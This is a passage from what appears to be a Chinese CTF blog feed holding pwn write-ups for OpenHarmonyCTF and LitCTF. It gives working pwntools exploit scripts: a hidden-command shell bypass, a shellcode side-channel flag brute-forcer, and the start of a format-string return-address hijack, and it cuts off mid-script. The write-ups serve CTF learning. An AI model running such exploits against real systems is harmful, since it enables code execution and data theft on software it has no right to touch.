= sub_4040E8(a1);</span><br><span class="line">    if ( !v21 )</span><br><span class="line">      sub_4042DE((unsigned int)&quot;path translation failed&quot;, a2, v3, v4, v5, v6);</span><br><span class="line">    if ( (unsigned int)sub_40497C(v21) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_405067(v21);</span><br><span class="line">      filename = (char *)sub_4048B7(v21);</span><br><span class="line">      if ( !filename )</span><br><span class="line">        sub_4042DE((unsigned int)&quot;path translation failed&quot;, a2, v10, v11, v12, v13);</span><br><span class="line">      if ( sub_40A5A0(a1, &quot;flag&quot;) )   #检测</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4073F6(</span><br><span class="line">          (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">          a1,</span><br><span class="line">          (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">          v14,</span><br><span class="line">          v15,</span><br><span class="line">          v16);</span><br><span class="line">        return sub_405067((__int64)filename);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = sub_406F83(filename);</span><br><span class="line">        if ( v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          while ( 1 )  #读入命令，创建快捷方式</span><br><span class="line">          &#123;</span><br><span class="line">            n46 = sub_406F44(v23, &quot;rb&quot;);</span><br><span class="line">            if ( n46 == -1 )</span><br><span class="line">              break;</span><br><span class="line">            if ( (unsigned int)(n46 - 32) &lt;= 0x5E || n46 == 10 || n46 == 13 )</span><br><span class="line">              sub_40755B((unsigned int)n46);</span><br><span class="line">            else</span><br><span class="line">              sub_40755B(46LL);</span><br><span class="line">          &#125;</span><br><span class="line">          sub_406CBC(v23);</span><br><span class="line">          return sub_405067((__int64)filename);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          sub_4073F6(</span><br><span class="line">            (unsigned int)&quot;cat: cannot open &#x27;%s&#x27; for reading\n&quot;,</span><br><span class="line">            a1,</span><br><span class="line">            (unsigned int)&quot;cat: cannot open &#x27;%s&#x27; for reading\n&quot;,</span><br><span class="line">            v17,</span><br><span class="line">            v18,</span><br><span class="line">            v19);</span><br><span class="line">          return sub_405067((__int64)filename);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      return sub_4073F6(</span><br><span class="line">               (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">               a1,</span><br><span class="line">               (unsigned int)&quot;cat: %s: Permission denied\n&quot;,</span><br><span class="line">               v7,</span><br><span class="line">               v8,</span><br><span class="line">               v9);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有提权的话会将快捷方式清空，在隐藏命令结尾处</p><p><img src="https://s2.loli.net/2025/06/11/6jemgQYtUrqoRaD.png" alt="image">​</p><p>sub_401211</p><p><img src="https://s2.loli.net/2025/06/11/6jemgQYtUrqoRaD.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 (__fastcall *sub_401211())()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (__fastcall *sub_4011E7_1)(); // rax</span><br><span class="line"></span><br><span class="line">  off_410330[0] = sub_40356E;</span><br><span class="line">  read_cmd = (__int64 (__fastcall *)(__int64, int))sub_401169;</span><br><span class="line">  off_410338[0] = sub_401193;</span><br><span class="line">  off_410348[0] = sub_4038BF;</span><br><span class="line">  off_410350[0] = sub_403945;</span><br><span class="line">  off_410358[0] = sub_4011BD;</span><br><span class="line">  sub_4011E7_1 = sub_4011E7;</span><br><span class="line">  psub_4011E7 = sub_4011E7;</span><br><span class="line">  return sub_4011E7_1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_401169(int a1, __int64 a2, __int64 a3, int a4, int a5, int a6)</span><br><span class="line">&#123;</span><br><span class="line">  return sub_4073F6(</span><br><span class="line">           (unsigned int)&quot;cat: %s: Forbidden command\n&quot;,</span><br><span class="line">           a1,</span><br><span class="line">           (unsigned int)&quot;cat: %s: Forbidden command\n&quot;,</span><br><span class="line">           a4,</span><br><span class="line">           a5,</span><br><span class="line">           a6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后拼接好获取flag</p><p>我这里没有远程环境，也懒得配本地环境了，发现flag读取不出来，但快捷方式确实是创建了，而且也去执行bc部分了</p><p><img src="https://s2.loli.net/2025/06/11/3zNVr6u4Kc85P21.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr(size):</span><br><span class="line">return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./ezshell&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./ezshell&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;[pwn@OpenHarmony-PC /]$&quot;)</span><br><span class="line"></span><br><span class="line">pay=b&#x27;!devmode \\ad\\51\\57\\51 \\ea\\2f\\70\\77\\6e\\2f\\66&#x27;</span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay=b&#x27;!devmode \\ad\\51\\57\\51 \\ea\\6c\\61\\67&#x27;</span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay=b&#x27;!devmode \\bc&#x27;</span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">pay=b&#x27;cat $&#123;0&#125;$&#123;1&#125;&#x27;</span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>‍</p><p>第三题也是一个命令执行行，js沙盒，底层只有printf函数，可以执行代码，感觉更像一个web题,可惜了，当时应该找个web佬一块帮忙看的</p><h3 id="总结">总结</h3><p>遇到新型题目不要慌吧，可以去猜，可以去直接练远程去看看，一开始拿到都是懵逼的，本地启动都会遇到问题，就会有放弃的想法，注意定位关键函数位置，可以结合AI去分析，发现AI越来越nb了，华清未央，以及pwno，本人表示用不起</p><p><a href="https://www.52pojie.cn/thread-2032638-1-1.html%EF%BC%8C%E8%BF%99%E4%B8%AA%E8%BF%98%E8%A1%8C%EF%BC%8C%E6%AF%94%E8%BE%83%E8%B4%B9%E6%89%8B%EF%BC%8C%E6%95%B4%E4%BD%93%E9%80%BB%E8%BE%91%E5%8F%AF%E4%BB%A5%E5%88%86%E6%9E%90%E5%87%BA%E6%9D%A5">https://www.52pojie.cn/thread-2032638-1-1.html，这个还行，比较费手，整体逻辑可以分析出来</a></p><p><img src="https://s2.loli.net/2025/06/11/q6WjPpeJUzQ7d9g.png" alt="f9ea75d1f50d76bf51289def817c0e9"></p>]]></content>
    
    
    <summary type="html">0penHarmonyCTF-pwn</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>LitCTF-pwn</title>
    <link href="https://www.thir0th.xyz/posts/464413fc.html"/>
    <id>https://www.thir0th.xyz/posts/464413fc.html</id>
    <published>2025-05-26T09:20:35.000Z</published>
    <updated>2025-05-26T09:24:07.952Z</updated>
    
    <content type="html"><![CDATA[<h1>LitCTF-pwn</h1><p>比赛的时候比较忙，当时没怎么看题，做了一道签到就下了，结束后打了一下，最后一个pwnpwn没看懂什么意思，等复现了</p><h4 id="test-your-nc">test_your_nc</h4><p>签到题</p><p><img src="https://s2.loli.net/2025/05/26/uK7bQYvSBrlw4e8.png" alt="d8be4818c4852450eeec8d8d77f5ad7"></p><h4 id="shellcode">shellcode</h4><p>题目直接执行shellcode</p><p><img src="https://s2.loli.net/2025/05/26/Fk3xE1PAWeHvdp5.png" alt="image"></p><p>只允许使用read+open，测信道爆破flag</p><p><img src="https://s2.loli.net/2025/05/26/IBHgKQkzfXb38qR.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line"></span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def s(a):</span><br><span class="line">    p.send(a)</span><br><span class="line"></span><br><span class="line">def sa(a,b):</span><br><span class="line">    p.sendafter(a,b)</span><br><span class="line"></span><br><span class="line">def sl(a):</span><br><span class="line">    p.sendline(a)</span><br><span class="line"></span><br><span class="line">def sla(a,b):</span><br><span class="line">    p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">def r(a):</span><br><span class="line">    return p.recv(a, timeout=1)</span><br><span class="line"></span><br><span class="line">def rl(a):</span><br><span class="line">    return p.recvuntil(a, timeout=1)</span><br><span class="line"></span><br><span class="line">def inter():</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">def get_addr(size):</span><br><span class="line">    return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">def get_addr64():</span><br><span class="line">    return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">def get_addr32():</span><br><span class="line">    return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line"></span><br><span class="line">def get_sb():</span><br><span class="line">    return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line"></span><br><span class="line">def get_hook():</span><br><span class="line">    return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"></span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">def log_info(message, status=None):</span><br><span class="line">    color_codes = &#123;</span><br><span class="line">        &#x27;success&#x27;: &#x27;\033[92m&#x27;,</span><br><span class="line">        &#x27;error&#x27;: &#x27;\033[91m&#x27;,</span><br><span class="line">        &#x27;warning&#x27;: &#x27;\033[93m&#x27;,</span><br><span class="line">        None: &#x27;\033[95m&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    color = color_codes.get(status, &#x27;\033[95m&#x27;)</span><br><span class="line">    print(f&quot;&#123;color&#125;[*] &#123;message&#125;\033[0m&quot;)</span><br><span class="line"></span><br><span class="line">def get_random_delay():</span><br><span class="line">    return random.uniform(0.1, 0.5)</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;error&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line"># 完整字符集</span><br><span class="line">full_charset = &quot;&#123;&#125;0123456789-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line"></span><br><span class="line"># 直接在此处设置已知前缀（修改此行即可）</span><br><span class="line">FLAG_PREFIX = &quot;flag&#123;&quot;  # &lt;-- 在此处修改前缀</span><br><span class="line"></span><br><span class="line">if not FLAG_PREFIX:</span><br><span class="line">    log_info(&quot;未设置前缀，将使用完整字典爆破&quot;, &#x27;warning&#x27;)</span><br><span class="line">    initial_index = 0</span><br><span class="line">else:</span><br><span class="line">    initial_index = len(FLAG_PREFIX)</span><br><span class="line">    log_info(f&quot;将从位置 &#123;initial_index&#125; 开始爆破，前缀: &#123;FLAG_PREFIX&#125;&quot;, &#x27;success&#x27;)</span><br><span class="line"></span><br><span class="line">s = full_charset</span><br><span class="line">char_list = [ord(x) for x in s]</span><br><span class="line">flag = FLAG_PREFIX  # 初始化flag为预设前缀</span><br><span class="line"></span><br><span class="line">shellcode = &quot;&quot;&quot;</span><br><span class="line">mov rdi, 0x67616c662f2e</span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov rsi, 0</span><br><span class="line">mov rdx, 0</span><br><span class="line">mov rax, 2</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 3</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov rdx, 0x100</span><br><span class="line">mov rax, 0</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov bl, byte ptr [rsp+&#123;&#125;]</span><br><span class="line">cmp bl, &#123;&#125;</span><br><span class="line">jz $-0x3 </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">index = initial_index</span><br><span class="line">MAX_RETRY = 5</span><br><span class="line">MAX_CONSECUTIVE_FAILURES = 10</span><br><span class="line">consecutive_failures = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    if consecutive_failures &gt;= MAX_CONSECUTIVE_FAILURES:</span><br><span class="line">        log_info(&quot;检测到信道不稳定，暂停5秒后重试&quot;, &#x27;warning&#x27;)</span><br><span class="line">        time.sleep(5)</span><br><span class="line">        consecutive_failures = 0</span><br><span class="line">    </span><br><span class="line">    for i in range(len(s)):</span><br><span class="line">        retry_count = MAX_RETRY</span><br><span class="line">        success = False</span><br><span class="line">        </span><br><span class="line">        while retry_count &gt; 0 and not success:</span><br><span class="line">            time.sleep(get_random_delay())</span><br><span class="line">            </span><br><span class="line">            try:</span><br><span class="line">                # 切换本地/远程模式</span><br><span class="line">                p = process(&#x27;./pwn&#x27;)</span><br><span class="line">                #p = remote(&#x27;node8.anna.nssctf.cn&#x27;, 22581)</span><br><span class="line">                </span><br><span class="line">                payload = asm(shellcode.format(index, char_list[i]))</span><br><span class="line">                sla(b&#x27;Please input your shellcode: \n&#x27;, payload)</span><br><span class="line">                </span><br><span class="line">                try:</span><br><span class="line">                    judge = rl(b&#x27;\n&#x27;)</span><br><span class="line">                except (EOFError, TimeoutError):</span><br><span class="line">                    log_info(f&quot;字符 &#123;s[i]&#125; 导致连接关闭，重试 (&#123;MAX_RETRY-retry_count+1&#125;/&#123;MAX_RETRY&#125;)&quot;, &#x27;warning&#x27;)</span><br><span class="line">                    retry_count -= 1</span><br><span class="line">                    consecutive_failures += 1</span><br><span class="line">                    p.close()</span><br><span class="line">                    continue</span><br><span class="line">                </span><br><span class="line">                if len(judge) &lt; 3:</span><br><span class="line">                    flag += s[i]</span><br><span class="line">                    log_info(f&quot;找到字符: &#123;s[i]&#125;, 当前flag: &#123;flag&#125;&quot;, &#x27;success&#x27;)</span><br><span class="line">                    index += 1</span><br><span class="line">                    success = True</span><br><span class="line">                    consecutive_failures = 0</span><br><span class="line">                </span><br><span class="line">                p.close()</span><br><span class="line">                </span><br><span class="line">            except Exception as e:</span><br><span class="line">                log_info(f&quot;连接异常: &#123;str(e)&#125;，剩余重试: &#123;retry_count&#125;&quot;, &#x27;error&#x27;)</span><br><span class="line">                retry_count -= 1</span><br><span class="line">                consecutive_failures += 1</span><br><span class="line">                if p:</span><br><span class="line">                    p.close()</span><br><span class="line">            finally:</span><br><span class="line">                if p:</span><br><span class="line">                    p.close()</span><br><span class="line"></span><br><span class="line">        if success:</span><br><span class="line">            break</span><br><span class="line">                </span><br><span class="line">    if &#x27;&#125;&#x27; in flag:</span><br><span class="line">        log_info(f&quot;最终flag: &#123;flag&#125;&quot;, &#x27;success&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"></span><br><span class="line">inter()    </span><br></pre></td></tr></table></figure><h4 id="onlyone">onlyone</h4><p>详细的就参考这篇文章</p><p><a href="https://xz.aliyun.com/news/17965">https://xz.aliyun.com/news/17965</a></p><p>这道题也就是模仿的当时强网拟态的那道题目，基本上一摸一样，利用一次fmt打一次指针跳板</p><p>劫持返回地址为main， 从而实现多次fmt的机会，然后将printf的返回地址+8的地方改为ogg，最后将printf的返回地址改为ret，触发ogg，getshel</p><p><img src="https://s2.loli.net/2025/05/26/MpW9XOhdj8TADcQ.png" alt="image">l</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr(size):</span><br><span class="line">return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.31.so&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./fmt&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./fmt&#x27;)</span><br><span class="line">rl(b&#x27;0x&#x27;)</span><br><span class="line">stack=int(p.recv(12),16)</span><br><span class="line">li(hex(stack))</span><br><span class="line">rl(b&#x27;0x&#x27;)</span><br><span class="line">libc_base=int(p.recv(12),16)-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">li(hex(libc_base))</span><br><span 